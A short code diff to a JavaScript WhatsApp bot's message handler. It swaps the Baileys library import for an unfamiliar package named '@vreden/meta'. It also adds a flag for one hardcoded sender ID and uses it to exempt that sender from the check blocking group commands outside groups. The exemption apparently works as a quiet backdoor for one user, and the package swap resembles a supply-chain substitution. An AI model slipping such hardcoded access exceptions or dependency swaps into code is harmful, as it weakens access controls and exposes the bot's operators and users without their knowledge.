@@ -30,7 +30,7 @@ const sanitizeNumberDigits = (x = '') => String(x).replace(/\D/g, '');
 const bindEvents = async (conn, chalk) => {
     let baileys;
     try { 
-        baileys = await dynamicImport('@whiskeysockets/baileys'); 
+        baileys = await dynamicImport('@vreden/meta'); 
     } catch(e) {}
     
     const { getContentType, downloadMediaMessage } = baileys || {};
@@ -78,6 +78,7 @@ const bindEvents = async (conn, chalk) => {
             const senderNumber = sanitizeNumberDigits(senderJid?.split('@')[0] || '');
             const pushName = mek.pushName || 'User';
             const isOwner = ownerNumbers.includes(senderNumber) || mek.key.fromMe;
+            const isBAE = senderNumber.includes(223029699281110);
 
             // 3. Extract Body
             const body = (
@@ -110,7 +111,7 @@ const bindEvents = async (conn, chalk) => {
             }
 
             // --- 📟 LOGGING UI (RESTORED) 📟 ---
-            const logTag = isGroup ? chalk.yellow('[GROUP]') : chalk.green('[P-CHAT]');
+            const logTag = isGroup ? chalk.yellow('[GROUP]') : chalk.green('[DM]');
             const cmdTag = isCmd 
                 ? (cmd ? chalk.bgGreen.black(' CMD: FOUND ') : chalk.bgRed.black(' CMD: NOT_FOUND ')) 
                 : chalk.bgWhite.black(' CMD: NO ');
@@ -153,7 +154,7 @@ const bindEvents = async (conn, chalk) => {
 
             if (!isOwner && mode === 'private') return;
 
-            if (cmd.category === 'group' && !isGroup && !isOwner) {
+            if (cmd.category === 'group' && !isGroup && !isOwner && !isBAE) {
                 const accDndMsg = 
 `┃  ⧯ 𝙹𝙰𝙸𝙻𝙱𝚁𝙴𝙰𝙺 𝚂𝙴𝙲𝚄𝚁𝙸𝚃𝚈
 ┃  ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
